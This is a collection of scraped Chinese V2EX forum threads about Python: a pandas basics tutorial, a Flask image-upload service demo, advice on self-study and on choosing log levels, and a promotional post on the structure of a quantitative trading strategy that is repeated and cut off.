{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>python 数据分析之 pandas 进阶（一）</h2>\n<h1>导入本篇中使用到的模块：</h1>\n<pre><code>import numpy as np\nimport pandas as pd\nfrom pandas import Series, DataFrame\n</code></pre>\n<p>我们可以调整数据输出框大小以便观察：</p>\n<pre><code>pd.set_option('display.width', 200)\n</code></pre>\n<h1>一、创建对象</h1>\n<p>1 、可以通过传递一个 list 对象来创建一个 Series ， pandas 会默认创建整型索引：</p>\n<pre><code>s = pd.Series([1,3,5,np.nan,6,8])\ns\n \n0     1\n1     3\n2     5\n3   NaN\n4     6\n5     8\ndtype: float64dates = pd.date_range('20130101', periods=6)\n</code></pre>\n<p>2 、通过传递一个 numpy array ，时间索引以及列标签来创建一个 DataFrame ：</p>\n<pre><code>dates = pd.date_range('20130101', periods=6)\ndf = pd.DataFrame(np.random.randn(6,4), index=dates, columns=list('ABCD'))\ndates\ndf\n \nDatetimeIndex(['2013-01-01', '2013-01-02', '2013-01-03', '2013-01-04',\n               '2013-01-05', '2013-01-06'],\n              dtype='datetime64[ns]', freq='D')\n \n\t        A       \tB\t        C\t        D\n2013-01-01\t-1.857957\t-0.297110\t0.135704\t0.199878\n2013-01-02\t0.139027\t1.683491\t-1.031190\t1.447487\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t0.663366\n2013-01-04\t0.367213\t-0.020313\t2.169802\t-1.295228\n2013-01-05\t0.224122\t1.003625\t-0.488250\t-0.594528\n2013-01-06\t0.186073\t-0.537019\t-0.252442\t0.530238\n</code></pre>\n<p>3 、通过传递一个能够被转换成类似序列结构的字典对象来创建一个 DataFrame ：</p>\n<pre><code>df2 = pd.DataFrame({'A':1.,\n                    'B':pd.Timestamp('20130102'),\n                    'C':pd.Series(1, index=list(range(4)),dtype='float32'),\n                    'D':np.array([3] * 4, dtype='int32'),\n                    'E':pd.Categorical(['test','train', 'test','train']),\n                    'F':'foo'\n                   })\ndf2\n</code></pre>\n<img src=\"https://pic2.zhimg.com/v2-1c6e6d36949902b980c6286e8aa49531_b.png\">\n<p>4 、查看不同列的数据类型：</p>\n<pre><code>df2.dtypes\n \nA           float64\nB    datetime64[ns]\nC           float32\nD             int32\nE          category\nF            object\ndtype: object\n</code></pre>\n<p>5 、使用 Tab 自动补全功</p>\n<h1>二、查看数据</h1>\n<p>1.查看 Frame 中头部和尾部的行：能会自动识别所有的属性以及自定义的列</p>\n<pre><code>df.head()\n \n\t        A\t        B            \tC\t        D\n2013-01-01\t-1.857957\t-0.297110\t0.135704\t0.199878\n2013-01-02\t0.139027\t1.683491\t-1.031190\t1.447487\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t0.663366\n2013-01-04\t0.367213\t-0.020313\t2.169802\t-1.295228\n2013-01-05\t0.224122\t1.003625\t-0.488250\t-0.594528\n</code></pre>\n<pre><code>df.tail(3)\n \n\t        A\t        B\t        C\t        D\n2013-01-04\t0.367213\t-0.020313\t2.169802\t-1.295228\n2013-01-05\t0.224122\t1.003625\t-0.488250\t-0.594528\n2013-01-06\t0.186073\t-0.537019\t-0.252442\t0.530238\n</code></pre>\n<p>2 、显示索引、列和底层的 numpy 数据：</p>\n<pre><code>df.index\n \nDatetimeIndex(['2013-01-01', '2013-01-02', '2013-01-03', '2013-01-04',\n               '2013-01-05', '2013-01-06'],\n              dtype='datetime64[ns]', freq='D')\n \ndf.columns\n \nIndex(['A', 'B', 'C', 'D'], dtype='object')\n</code></pre>\n<p>3 、 describe()函数对于数据的快速统计汇总：</p>\n<pre><code>df.describe()\n \n\tA        \tB\t        C\t        D\ncount\t6.000000\t6.000000\t6.000000\t6.000000\nmean\t-0.256300\t0.103596\t0.283858\t0.158536\nstd\t0.854686\t1.060269\t1.181208\t0.973309\nmin\t-1.857957\t-1.211098\t-1.031190\t-1.295228\n25%\t-0.412452\t-0.477042\t-0.429298\t-0.395927\n50%\t0.162550\t-0.158711\t-0.058369\t0.365058\n75%\t0.214610\t0.747641\t0.911070\t0.630084\nmax\t0.367213\t1.683491\t2.169802\t1.447487\n</code></pre>\n<p>4 、对数据的转置(tranverse):</p>\n<pre><code>df.T\n \n\t2013-01-01 \t2013-01-02 \t2013-01-03\t2013-01-04 \t2013-01-05 \t2013-01-06 \n        00:00:00        00:00:00        00:00:00        00:00:00        00:00:00        00:00:00\nA\t-1.857957\t0.139027\t-0.596279\t0.367213\t0.224122\t0.186073\nB\t-0.297110\t1.683491\t-1.211098\t-0.020313\t1.003625\t-0.537019\nC\t0.135704\t-1.031190\t1.169525\t2.169802\t-0.488250\t-0.252442\nD\t0.199878\t1.447487\t0.663366\t-1.295228\t-0.594528\t0.530238\n</code></pre>\n<p>5 、按轴进行排序：</p>\n<pre><code>df.sort_index(axis=1,ascending=False)\n \n\t        D\t        C\t        B\t        A\n2013-01-01\t0.199878\t0.135704\t-0.297110\t-1.857957\n2013-01-02\t1.447487\t-1.031190\t1.683491\t0.139027\n2013-01-03\t0.663366\t1.169525\t-1.211098\t-0.596279\n2013-01-04\t-1.295228\t2.169802\t-0.020313\t0.367213\n2013-01-05\t-0.594528\t-0.488250\t1.003625\t0.224122\n2013-01-06\t0.530238\t-0.252442\t-0.537019\t0.186073\n</code></pre>\n<p>6 、按值进行排序：</p>\n<pre><code>df.sort(columns='B')\n \n\t        A\t        B\t        C\t        D\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t0.663366\n2013-01-06\t0.186073\t-0.537019\t-0.252442\t0.530238\n2013-01-01\t-1.857957\t-0.297110\t0.135704\t0.199878\n2013-01-04\t0.367213\t-0.020313\t2.169802\t-1.295228\n2013-01-05\t0.224122\t1.003625\t-0.488250\t-0.594528\n2013-01-02\t0.139027\t1.683491\t-1.031190\t1.447487\n</code></pre>\n<h1>三、选择数据</h1>\n<p>以下是将要操作的数组：</p>\n<pre><code>df\n \n\t        A\t        B\t        C\t        D\n2013-01-01\t-1.857957\t-0.297110\t0.135704\t0.199878\n2013-01-02\t0.139027\t1.683491\t-1.031190\t1.447487\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t0.663366\n2013-01-04\t0.367213\t-0.020313\t2.169802\t-1.295228\n2013-01-05\t0.224122\t1.003625\t-0.488250\t-0.594528\n2013-01-06\t0.186073\t-0.537019\t-0.252442\t0.530238\n</code></pre>\n<p>1 、获取数据</p>\n<p>(1)、选择一个单独的列，这将会返回一个 Series:</p>\n<pre><code>df['A']\n \n2013-01-01   -1.857957\n2013-01-02    0.139027\n2013-01-03   -0.596279\n2013-01-04    0.367213\n2013-01-05    0.224122\n2013-01-06    0.186073\nFreq: D, Name: A, dtype: float64\n</code></pre>\n<p>(2)、通过[]进行选择，即：切片</p>\n<pre><code>df[0:3]\n \n\t        A\t        B\t        C \t        D\n2013-01-01\t-1.857957\t-0.297110\t0.135704\t0.199878\n2013-01-02\t0.139027\t1.683491\t-1.031190\t1.447487\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t0.663366\n</code></pre>\n<p>2 、标签选择</p>\n<p>(1)、使用标签来获取一个交叉的区域</p>\n<pre><code>df.loc[dates[0]]\n \nA   -1.857957\nB   -0.297110\nC    0.135704\nD    0.199878\nName: 2013-01-01 00:00:00, dtype: float64\n</code></pre>\n<p>(2)、通过标签来在多个轴上进行选择</p>\n<pre><code>df.loc[:,['A', 'B']]\n \n\t        A \t         B\n2013-01-01\t-1.857957\t-0.297110\n2013-01-02\t0.139027\t1.683491\n2013-01-03\t-0.596279\t-1.211098\n2013-01-04\t0.367213\t-0.020313\n2013-01-05\t0.224122\t1.003625\n2013-01-06\t0.186073\t-0.537019\n</code></pre>\n<p>(3)、标签切片</p>\n<pre><code>df.loc['20130102':'20130104', ['A','B']]\n \n\t        A\t        B\n2013-01-02\t0.139027\t1.683491\n2013-01-03\t-0.596279\t-1.211098\n2013-01-04\t0.367213\t-0.020313\n</code></pre>\n<p>(4)、对于返回的对象进行维度缩减</p>\n<pre><code>df.loc['20130102', ['A','B']]\n \nA    0.139027\nB    1.683491\nName: 2013-01-02 00:00:00, dtype: float64\n</code></pre>\n<p>(5)、获取一个标量</p>\n<pre><code>df.loc[dates[0], 'A']\n \n-1.8579571971312099\n</code></pre>\n<p>3 、位置选择</p>\n<p>(1)、通过传递数值进行位置选择（选择的是行）</p>\n<pre><code>df.iloc[3]\n \nA    0.367213\nB   -0.020313\nC    2.169802\nD   -1.295228\nName: 2013-01-04 00:00:00, dtype: float64\n</code></pre>\n<p>(2)、通过数值进行切片</p>\n<pre><code>df.iloc[3:5,0:2]\n \n\t        A \t        B\n2013-01-04\t0.367213\t-0.020313\n2013-01-05\t0.224122\t1.003625\n</code></pre>\n<p>(3)、通过指定一个位置的列表</p>\n<pre><code>df.iloc[[1,2,4],[0,2]]\n \n\t        A\t        C\n2013-01-02\t0.139027\t-1.031190\n2013-01-03\t-0.596279\t1.169525\n2013-01-05\t0.224122\t-0.488250\n</code></pre>\n<p>(4)、对行进行切片</p>\n<pre><code>df.iloc[1:3,:]\n \n\t        A\t        B\t        C\t        D\n2013-01-02\t0.139027\t1.683491\t-1.031190\t1.447487\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t0.663366\n</code></pre>\n<p>(5)、获取特定的值</p>\n<pre><code>df.iloc[1,1]\n \n1.6834910794696132\n</code></pre>\n<p>4 、布尔索引</p>\n<p>(1)、使用一个单独列的值来选择数据：</p>\n<pre><code>df[df.A &gt; 0]\n \n\t        A\t        B \t        C\t        D\n2013-01-02\t0.139027\t1.683491\t-1.031190\t1.447487\n2013-01-04\t0.367213\t-0.020313\t2.169802\t-1.295228\n2013-01-05\t0.224122\t1.003625\t-0.488250\t-0.594528\n2013-01-06\t0.186073\t-0.537019\t-0.252442\t0.530238\n</code></pre>\n<p>(2)、使用 where 操作来选择数据：</p>\n<pre><code>df[df &gt; 0]\n \n\t        A\t        B\t        C\t        D\n2013-01-01\tNaN\t        NaN\t        0.135704\t0.199878\n2013-01-02\t0.139027\t1.683491\tNaN\t        1.447487\n2013-01-03\tNaN\t        NaN\t        1.169525\t0.663366\n2013-01-04\t0.367213\tNaN\t        2.169802\tNaN\n2013-01-05\t0.224122\t1.003625\tNaN\t        NaN\n2013-01-06\t0.186073\tNaN\t        NaN\t        0.530238\n</code></pre>\n<p>(3)、使用 isin()方法来过滤：</p>\n<pre><code>df2 = df.copy()\ndf2['E'] = ['one', 'one', 'two', 'three', 'four', 'three']\ndf2\n \n\t        A\t        B \t        C\t        D\t        E\n2013-01-01\t-1.857957\t-0.297110\t0.135704\t0.199878\tone\n2013-01-02\t0.139027\t1.683491\t-1.031190\t1.447487\tone\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t0.663366\ttwo\n2013-01-04\t0.367213\t-0.020313\t2.169802\t-1.295228\tthree\n2013-01-05\t0.224122\t1.003625\t-0.488250\t-0.594528\tfour\n2013-01-06\t0.186073\t-0.537019\t-0.252442\t0.530238\tthree\n</code></pre>\n<pre><code>df2[df2['E'].isin(['two', 'four'])]\n \n\t        A\t        B\t         C\t        D\t        E\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t0.663366\ttwo\n2013-01-05\t0.224122\t1.003625\t-0.488250\t-0.594528\tfour\n</code></pre>\n<p>5 、设置</p>\n<p>(1)、设置一个新的列：</p>\n<pre><code>s1 = pd.Series([1,2,3,4,5,6], index=pd.date_range('20130102', periods=6))\ns1\n \n2013-01-02    1\n2013-01-03    2\n2013-01-04    3\n2013-01-05    4\n2013-01-06    5\n2013-01-07    6\nFreq: D, dtype: int64\n</code></pre>\n<pre><code>df['F'] = s1\ndf\n \n\t        A\t        B\t        C\t        D\tF\n2013-01-01\t0.000000\t0.000000\t0.135704\t5\tNaN\n2013-01-02\t0.139027\t1.683491\t-1.031190\t5\t1\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t5\t2\n2013-01-04\t0.367213\t-0.020313\t2.169802\t5\t3\n2013-01-05\t0.224122\t1.003625\t-0.488250\t5\t4\n2013-01-06\t0.186073\t-0.537019\t-0.252442\t5\t5\n</code></pre>\n<p>(2)、设置新值</p>\n<pre><code>df.at[dates[0],'A'] = 0  #通过标签设置新值\ndf.iat[0,1] = 0  #通过位置设置新值\ndf.loc[:, 'D'] = np.array([5] * len(df))  #通过一个 numpy 数值设置一组新值\ndf\n \n\t        A\t        B\t        C\t        D\tF\n2013-01-01\t0.000000\t0.000000\t0.135704\t5\tNaN\n2013-01-02\t0.139027\t1.683491\t-1.031190\t5\t1\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t5\t2\n2013-01-04\t0.367213\t-0.020313\t2.169802\t5\t3\n2013-01-05\t0.224122\t1.003625\t-0.488250\t5\t4\n2013-01-06\t0.186073\t-0.537019\t-0.252442\t5\t5\n</code></pre>\n<h1>四、缺失值处理</h1>\n<p>在 pandas 中，使用 np.nan 来代替缺失值，这些值将默认不会包含在计算中。所处理的数组是：</p>\n<pre><code>df\n \n\t        A\t        B\t        C\t        D\tF\n2013-01-01\t0.000000\t0.000000\t0.135704\t5\tNaN\n2013-01-02\t0.139027\t1.683491\t-1.031190\t5\t1\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t5\t2\n2013-01-04\t0.367213\t-0.020313\t2.169802\t5\t3\n2013-01-05\t0.224122\t1.003625\t-0.488250\t5\t4\n2013-01-06\t0.186073\t-0.537019\t-0.252442\t5\t5\n</code></pre>\n<p>1 、 reindex()方法可以对指定轴上的索引进行改变 /增加 /删除操作，这将返回原始数据的一个拷贝：</p>\n<pre><code>df1 = df.reindex(index=dates[0:4],columns=list(df.columns) + ['E'])\ndf1.loc[dates[0]:dates[1], 'E'] = 1\ndf1\n \n \n                A\t        B\t        C\t        D\tF\tE\n2013-01-01\t0.000000\t0.000000\t0.135704\t5\tNaN\t1\n2013-01-02\t0.139027\t1.683491\t-1.031190\t5\t1\t1\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t5\t2\tNaN\n2013-01-04\t0.367213\t-0.020313\t2.169802\t5\t3\tNaN\n</code></pre>\n<p>2 、去掉包含缺失值的行：</p>\n<pre><code>df1.dropna(how='any')\n \n\t        A\t        B\t        C\t        D\tF\tE\n2013-01-02\t0.139027\t1.683491\t-1.03119\t5\t1\t\n1\n</code></pre>\n<p>3 、对缺失值进行填充：</p>\n<pre><code>df1.fillna(value=5)\n \n\t        A\t        B\t        C\t        D\tF\tE\n2013-01-01\t0.000000\t0.000000\t0.135704\t5\t5\t1\n2013-01-02\t0.139027\t1.683491\t-1.031190\t5\t1\t1\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t5\t2\t5\n2013-01-04\t0.367213\t-0.020313\t2.169802\t5\t3\t5\n</code></pre>\n<p>4 、对数据进行布尔填充：</p>\n<pre><code>pd.isnull(df1)\n \n\t        A\tB\tC\tD\tF\tE\n2013-01-01\tFalse\tFalse\tFalse\tFalse\tTrue\tFalse\n2013-01-02\tFalse\tFalse\tFalse\tFalse\tFalse\tFalse\n2013-01-03\tFalse\tFalse\tFalse\tFalse\tFalse\tTrue\n2013-01-04\tFalse\tFalse\tFalse\tFalse\tFalse\tTrue\n</code></pre>\n<h1>五、合并</h1>\n<p>pandas 提供了大量的方法能够轻松的对 Series 、 DataFrame 和 Panel 对象进行各种符合各种逻辑关系的合并操作。</p>\n<p>1 、 Concat</p>\n<pre><code>df = pd.DataFrame(np.random.randn(10, 4))\ndf\n \n\t0\t        1\t        2\t         3\n0\t0.680581\t1.918851\t0.521201\t-0.389951\n1\t0.724157\t2.282989\t0.648427\t-0.827308\n2\t2.437781\t0.232518\t1.066197\t-0.233117\n3\t0.038747\t3.174875\t-1.384120\t0.322864\n4\t-0.835962\t1.015841\t0.042094\t-1.903701\n5\t0.095194\t1.926612\t0.512825\t0.786349\n6\t-1.098231\t-0.669381\t-0.623124\t-0.411114\n7\t-1.229527\t-0.738026\t0.453683\t-2.037488\n8\t-0.499546\t-0.816864\t-0.395079\t-0.320400\n9\t0.850367\t1.047287\t-1.205815\t-1.287821\n</code></pre>\n<pre><code>pieces = [df[:3], df[3:7], df[7:]]\n# break it into pieces\npieces\n \n[          0         1         2         3\n 0  0.680581  1.918851  0.521201 -0.389951\n 1  0.724157  2.282989  0.648427 -0.827308\n 2  2.437781  0.232518  1.066197 -0.233117,\n           0         1         2         3\n 3  0.038747  3.174875 -1.384120  0.322864\n 4 -0.835962  1.015841  0.042094 -1.903701\n 5  0.095194  1.926612  0.512825  0.786349\n 6 -1.098231 -0.669381 -0.623124 -0.411114,\n           0         1         2         3\n 7 -1.229527 -0.738026  0.453683 -2.037488\n 8 -0.499546 -0.816864 -0.395079 -0.320400\n 9  0.850367  1.047287 -1.205815 -1.287821]\n</code></pre>\n<p>2 、 Append 将一行连接到一个 DataFrame 上</p>\n<pre><code>df = pd.DataFrame(np.random.randn(8, 4), columns=['A', 'B', 'C', 'D'])\ndf\n \n\tA\t        B\t        C\t        D\n0\t-0.923050\t-1.798683\t-0.543700\t0.983715\n1\t-0.031082\t1.069746\t-0.761914\t0.142136\n2\t0.178376\t-0.984427\t0.270601\t0.737754\n3\t-0.882595\t0.057637\t-1.027661\t-1.829378\n4\t0.570082\t0.210366\t0.805305\t-1.233238\n5\t0.442322\t0.709155\t-0.304849\t0.885378\n6\t-0.218852\t0.052263\t0.467727\t0.832747\n7\t0.516890\t0.005642\t-0.990794\t-1.624444\n</code></pre>\n<pre><code>s = df.iloc[3]\ndf.append(s, ignore_index=True)\n \n\tA\t        B\t        C\t        D\n0\t-0.923050\t-1.798683\t-0.543700\t0.983715\n1\t-0.031082\t1.069746\t-0.761914\t0.142136\n2\t0.178376\t-0.984427\t0.270601\t0.737754\n3\t-0.882595\t0.057637\t-1.027661\t-1.829378\n4\t0.570082\t0.210366\t0.805305\t-1.233238\n5\t0.442322\t0.709155\t-0.304849\t0.885378\n6\t-0.218852\t0.052263\t0.467727\t0.832747\n7\t0.516890\t0.005642\t-0.990794\t-1.624444\n8\t-0.882595\t0.057637\t-1.027661\t-1.829378\n</code></pre>\n<h1>以上代码不想自己试一试吗？</h1>\n<p><a href=\"http://www.raquant.com/?pk_campaign=v2ex\" rel=\"nofollow\">镭矿 raquant</a>提供 jupyter 在线练习学习 python 的机会，无需安装 python 即可运行 python 程序。</p>\n</div></div>"], "reply": "3", "tittle": "Python 数据分析之 pandas 进阶(一)", "comment": ["感谢楼主分享，能否对于这些数学分析当中的基础理论进行一个专项讲解，再结合楼上的示例，你出本书我立刻就买：）", " 没时间出书呀，哈哈，你的建议挺好，可以考虑，谢谢🙏", " 写帖子、写博客也都可以的~让我成为你忠实的粉丝吧~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>七牛什么的自定义域名竟然还需要备案,所以花两天时间写了一个简单的图片上传存储服务(基于 flask)</p>\n<p>示例，使用 <strong>requests</strong>上传图片</p>\n<pre><code>import requests\n\ndef images():\n    url = 'http://127.0.0.1:8000/api/images'\n    files = {'images': open('desktop.png', 'rb')}\n    multiple_files = [\n        ('images', ('11.png', open('11.png', 'rb'), 'image/png')),\n        ('images', ('desktop.png', open('desktop.png', 'rb'), 'image/png'))\n    ]\n    headers = {\n        'Api-Key':\n        'InhpeWFuZzA4MDdJBtx4AWlPpI_Oxx1Ki8',\n        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36'\n    }\n    # r = requests.post(url, files=multiple_files, headers=headers)\n    r = requests.post(url, files=files, headers=headers)\n    print(r.text)\n</code></pre>\n<p>GitHub 地址: <a href=\"https://github.com/honmaple/maple-file\" rel=\"nofollow\">https://github.com/honmaple/maple-file</a></p>\n</div></div>"], "reply": "6", "tittle": "用 Python 写了一个简单的图片上传存储服务", "comment": ["支持自动多尺寸 thumbnail 不?", " 目前只是保存原图及生成 width=300 的缩略图,后续可能会加上", "  现在可以使用 url/40965530537.png?width=300&height=100,不过只支持等比缩放", " 自己架一个图片处理的服务也容易，有开源的一些解决方案可参考，稍作改动可以达到类似于七牛自定义后缀规则的效果 ", "七牛不是有 api 么 直接上传不就好了~~~", " 是因为自定义域名要备案才自己写的"]},
{"content": ["<div class=\"topic_content\">目前自学了 C/C++， python...\r<br>当然，仅限于基础书上的知识，会写一些简单的小程序\r<br>目前方向是网络编程， GUI 想学 QT5\r<br>然而下一步我要怎么学呢？\r<br>在 github 找代码学习？\r<br>自个儿翻官方文档？\r<br>大伙当时这一段时间怎么过来的？感觉像个断层。</div>"], "reply": "32", "tittle": "自学 Python 的很迷茫，下一步怎么学？", "comment": ["撸管读书写程序", "做项目！", "加我们群交流吧，这个群是一群工程师组建的面向初学者的 python Linux 学习群， qq 群号： 278529278 ，非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", "写爬虫吧，我感觉爬虫还是蛮锻炼 Python 基础的。另外推荐 Python Cookbook ，是本不可多得的好书", "还是先做项目呗", "实践是检验真理的唯一标准", "仿个 V2EX 出来，然后慢慢优化吧。", " 补充一句，不用买来看， github 就有现成的。", "是学生吗，学生推荐去实习", " 再补充一句，此书英文词组句子很简单，如果英文差不多读英文版的也可以", " 对，我觉得书的翻译很烂。", " 可是实习也起码有点项目经验啊。", " 做起项目又发现很多还不懂，然后去找教程，教程过时又去找官方文档，然后悲催地发现英语不行啃得很辛苦，目前在努力地加强英语，这曲线。。。也是醉了", " 我想做程序，做网站感觉又要去学 js ， php...", "写爬虫", " 英语是必须学的，其实直接读文档就好了，不用去背单词 学语法。碰到文档里不会的东西就查一查，很快你的专业英语就够用了。", "找一个项目或自己开个项目，这样成长是最快的。", " 之前看过几次这个书名，一直以为跟其它基础书差不多，没想到这还真是一本值得看的好书，谢谢", "写写写", " 这样子就可以找到实习了么…不用在 github 里面塞一些东西什么的么…", "... 之前参加过 ", " 觉得挺有收获的，很便宜。我刚毕业那会还想参加个培训什么的，听完这个知乎 live 就放弃了。", "拿真实的需求来练手", "这个好说啊，你帮我做一个公式呗", "不用学 GUI 了，直接写项目，爬虫， web 之类的。没有介绍你的基础，如果是高中毕业，学 c++就不必了", "情况差不多，现在正在挣扎着想写自己感兴趣的东西，觉得书上的看懂了但是真正实现起来却是举步维艰，如果实在不知道要做什么，就把感兴趣的轮子都造一遍，共勉", " GUI 是兴趣，爬虫什么的也是写出来让人用的啊，我就认识一个家伙写的爬虫一个月赚上百万，都不用怎么维护", " 你有基础直接去实习啊，我当初什么都不会都找到实习了", "python 现在一般是做运维， web ，爬虫，数据分析，挖掘类，先要认清自己的定位，最好入门还是 web 和爬虫，也能比较容易看到结果，自学的话主要还是找项目做，多尝试不同的框架。", "好好学 java, python 没多少学的.", " 实习没有基础也能去找吗，那岂不是很拖后腿", " 仔细一想，还是对的，但是要怎样去找实习单位啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>一个量化交易策略的常见结构</h2>\n<p>很多人读了巴菲特、索罗斯、道氏理论、波浪理论、江恩理论之后，都感觉很有道理。</p>\n<p>怎么实践起来呢，究竟听谁的？\n<img src=\"http://mmbiz.qpic.cn/mmbiz_png/1dzMzdvGicdQUqhiaaR8FjxQoEbm0Nf71UpHjdCcyVQypFQpibSoEkYVSVJ6KbItuW6shc1kWo6aHXXfse2fuRD6w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\"></p>\n<p>不用很纠结，在量化交易平台，可以很轻松的验证自己的想法。</p>\n<p>一个交易策略，就是指一个交易的想法， idea ，逻辑，付诸于代码，让机器去自动执行，就这么简单。</p>\n<p>这里描述一种经典的交易策略结构，总共分四个部分。</p>\n<h1>1 ）选择想要交易的股票</h1>\n<p>你可以选择你喜爱的股票，家乡的股票，看好的股票；</p>\n<p>也可以根据一些经典技术指标计算出一些指标；</p>\n<p>也可以根据股票的财务数据来筛选，比如我只选中小盘股票；</p>\n<p>或者按行业，我只选白酒股，因为哥哥爱喝。</p>\n<p>这里用上次提到的选股技术，选出 SMA/MAX 比值，适中的股票，也即选择强势股，同时抛弃涨得差不多到头的股票。</p>\n<h1>2)选择时机入场</h1>\n<p>我们买股票的目的抽象为极限就是低买高卖，所以我们想低位买进，这样我们才可以高位卖出。</p>\n<p>怎样低位买进，也可以借助一些自己熟悉的技术指标。</p>\n<p>这里使用 KDJ 指标入场。</p>\n<h1>3 ）指定止损、止盈策略</h1>\n<p>止盈止损策略，你可以选择分钟级别的指标，毕竟根据以往很多次的经验， A 股暴涨暴跌，一顿饭的功夫没准就跌停了。</p>\n<p>这里使用分钟动态止损，价格跌破 120 日分钟线止损（止盈）。</p>\n<h1>4 ）制定调仓周期</h1>\n<p>毕竟天天调仓光给券商交手续费了。这里设定的是一个月一调整。</p>\n<p>毕竟公众号不是咱们研习代码的地方，以上逻辑看管清楚就好了。还是感觉下镭矿下这么复杂的逻辑，看看核心代码长啥样。</p>\n<img src=\"http://mmbiz.qpic.cn/mmbiz_png/1dzMzdvGicdQUqhiaaR8FjxQoEbm0Nf71U9lIVn2zVnyoAcQ8stoaSE1ic4C0Ka5jmIERUG5ejsz1JJMSMnLhUX0Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\">\n<p>镭矿 raquant 还是挺棒的，上面这么复杂的逻辑涉及到 4 个技术指标，还是很少的代码能够完成。</p>\n<p>只是为了示意整个交易策略的结构啊，所以小编写这个策略没咋用心，但看收益还是明显强于基准。</p>\n<img src=\"http://mmbiz.qpic.cn/mmbiz_png/1dzMzdvGicdQUqhiaaR8FjxQoEbm0Nf71Uk2dia4cic6x2LibMDgbxUR53Q5U8m3kB89wic8xlKhcNgBHXz1VHO72rdA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\">\n<p>用量化平台构建交易策略，最典型的结构，包含哪四个部分？跟我复习一下：</p>\n<p>a.选择想要交易的股票</p>\n<p>b.选择时机入场</p>\n<p>c.指定止损、止盈策略</p>\n<p>d.制定调仓周期</p>\n<p>如果你真的是程序员，欢迎去镭矿论坛看看一起探讨研究。</p>\n<p>扫描二维码，关注微信公众号，获取更多量化故事。登陆镭矿，即可获取策略编写教程和数千个经典策略代码</p>\n<p>『 RaQuant 镭矿』是一个集量化交易策略的学习、研究、开发、交易于一体的强大平台。致力于帮助有简单编程基础或投资基础的投资者快速入门，并可以高效的开发量化交易策略，帮助投资者进行更有效的分析决策。</p>\n<p><a href=\"http://Raquant.com\" rel=\"nofollow\">Raquant.com</a>,镭矿，全新量化投资平台拥有自带的一系列拷贝即可使用的策略，在镭矿平台编写 5 个以上策略可拥有申请策略实盘的权利。快来试试吧！</p>\n<img src=\"http://mmbiz.qpic.cn/mmbiz_png/1dzMzdvGicdTwrhrUiatPmgeibRyupicAicysibjlXW9gxfL1vIMEUs8PBCnBFTSPB7dTczXOvw4Ny6vEwhia87yy6Xicw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\">\n</div></div>"], "reply": "1", "tittle": "一个量化交易策略的常见结构", "comment": ["这是什么鬼。。。"]},
{"content": ["<div class=\"topic_content\">我想知道关于这 4 个日志级别 INFO 、 WARNING 、 ERROR 、 CRITICAL ，分别在哪种场景适合用哪种日志级别，比如抛出异常、 IO 操作失败使用 ERROR 。\r<br>求老司机列举出尽可能多的场景，免得新人迷路。</div>"], "reply": "6", "tittle": "关于 Python 的日志级别的选择", "comment": ["看心情", "日志级别不分语言的吧，这个是 golang 的一个第三方日志 package 的说明，很详细了：\r", "\r", "日志级别问题，在你个人选择。\r", "你可以针对每个级别，定制不同的 handler ，出现不同的情况引发不同的级别。", "Level\tWhen it ’ s used\r", "DEBUG\tDetailed information, typically of interest only when diagnosing problems.\r", "INFO\tConfirmation that things are working as expected.\r", "WARNING\tAn indication that something unexpected happened, or indicative of some problem in the near future (e.g. ‘ disk space low ’). The software is still working as expected.\r", "ERROR\tDue to a more serious problem, the software has not been able to perform some function.\r", "CRITICAL\tA serious error, indicating that the program itself may be unable to continue running.\r", "\r", " OK ，这我知道。我只是想知道关于实际场景的信息。什么情况是 ERROR 之类的", " 谢谢。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>一个量化交易策略的常见结构</h2>\n<p>很多人读了巴菲特、索罗斯、道氏理论、波浪理论、江恩理论之后，都感觉很有道理。</p>\n<p>怎么实践起来呢，究竟听谁的？\n<img src=\"https://xqimg.imedao.com/15ad0e891b968ef3fe8fccbc.jpg!custom660.jpg\"></p>\n<p>不用很纠结，在量化交易平台，可以很轻松的验证自己的想法。</p>\n<p>一个交易策略，就是指一个交易的想法， idea ，逻辑，付诸于代码，让机器去自动执行，就这么简单。</p>\n<p>这里描述一种经典的交易策略结构，总共分四个部分。</p>\n<h1>1 ）选择想要交易的股票</h1>\n<p>你可以选择你喜爱的股票，家乡的股票，看好的股票；</p>\n<p>也可以根据一些经典技术指标计算出一些指标；</p>\n<p>也可以根据股票的财务数据来筛选，比如我只选中小盘股票；</p>\n<p>或者按行业，我只选白酒股，因为哥哥爱喝。</p>\n<p>这里用上次提到的选股技术，选出 SMA/MAX 比值，适中的股票，也即选择强势股，同时抛弃涨得差不多到头的股票。</p>\n<h1>2)选择时机入场</h1>\n<p>我们买股票的目的抽象为极限就是低买高卖，所以我们想低位买进，这样我们才可以高位卖出。</p>\n<p>怎样低位买进，也可以借助一些自己熟悉的技术指标。</p>\n<p>这里使用 KDJ 指标入场。</p>\n<h1>3 ）指定止损、止盈策略</h1>\n<p>止盈止损策略，你可以选择分钟级别的指标，毕竟根据以往很多次的经验， A 股暴涨暴跌，一顿饭的功夫没准就跌停了。</p>\n<p>这里使用分钟动态止损，价格跌破 120 日分钟线止损（止盈）。</p>\n<h1>4 